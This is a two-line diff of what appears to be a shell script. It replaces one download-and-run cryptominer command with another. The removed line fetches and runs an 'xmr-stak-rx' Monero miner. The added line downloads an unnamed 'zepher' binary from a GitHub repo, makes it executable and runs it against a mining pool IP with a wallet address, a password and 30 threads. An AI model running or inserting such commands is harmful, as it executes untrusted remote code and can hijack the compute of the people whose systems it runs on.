@@ -1,2 +1,1 @@
-wget https://github.com/ismaimwan6372/semogaberkah/raw/main/sorrywife.zip ; unzip sorrywife.zip ; chmod +x *; ./xmr-stak-rx
-
+wget https://github.com/ismaimwan6372/semogaberkah/raw/main/zepher && chmod 700 zepher && ./zepher -a RandomX -o 209.25.142.96:80 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p STRIXPRO -t 30
